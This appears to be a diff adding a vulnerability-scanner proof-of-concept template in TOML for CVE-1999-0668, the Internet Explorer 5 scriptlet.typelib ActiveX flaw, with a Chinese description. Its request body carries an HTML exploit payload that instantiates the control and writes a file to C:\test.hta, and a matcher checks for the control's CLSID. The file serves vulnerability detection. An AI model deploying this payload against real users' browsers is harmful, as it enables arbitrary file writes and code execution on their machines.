@@ -1,0 +1,29 @@
+[info]
+author = "ave"
+description = "Microsoft Internet Explorer 5 scriptlet.typelib ActiveX 控件被错误标记为对脚本安全(Safe for Scripting)，远程攻击者可构造含 CLSID:06290BD5-48AA-11D2-8432-006008C3FBFC 的恶意网页诱导用户访问，利用 scr.Reset()/scr.Path/scr.Write() 方法绕过安全限制写文件执行任意命令。已被 Bubbleboy 蠕虫利用。"
+id = "POC-AVE-1999-0184"
+name = "Microsoft Internet Explorer 5 ActiveX TypeLib RCE PoC"
+severity = "medium"
+tags = ["ave-1999-0184"]
+vuln_id = [
+    "CVE-1999-0668",
+    "AVE-1999-0184",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.body]
+content = '<html><body><object id="scr" classid="clsid:06290BD5-48AA-11D2-8432-006008C3FBFC"></object><script>scr.Reset();scr.Path="C:\\test.hta";scr.Doc=1;scr.Write();</script></body></html>'
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["clsid:06290BD5-48AA-11D2-8432-006008C3FBFC"]
